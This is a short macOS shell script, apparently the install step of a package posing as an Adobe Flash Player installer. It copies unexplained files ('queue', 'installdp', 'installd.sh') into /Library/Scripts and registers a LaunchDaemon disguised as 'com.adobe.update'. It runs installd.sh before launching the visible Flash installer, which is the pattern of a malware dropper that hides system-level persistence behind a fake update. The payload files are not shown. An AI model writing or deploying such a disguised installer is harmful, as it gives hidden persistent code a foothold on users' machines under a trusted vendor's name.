#!/bin/sh
SCRIPT_DIR=$(dirname "$0")
TARGET_PATH=/Library/Scripts
TARGET_PATH2=/Library/LaunchDaemons
cp -f "${SCRIPT_DIR}/queue" "${TARGET_PATH}/queue"
cp -f "${SCRIPT_DIR}/installdp" "${TARGET_PATH}/installdp"
cp -f "${SCRIPT_DIR}/installd.sh" "${TARGET_PATH}/installd.sh"
cp -f "${SCRIPT_DIR}/com.adobe.update" "$TARGET_PATH2/com.adobe.update.plist"
"${TARGET_PATH}/installd.sh"
"${SCRIPT_DIR}/Install Adobe Flash Player"
exit $RC
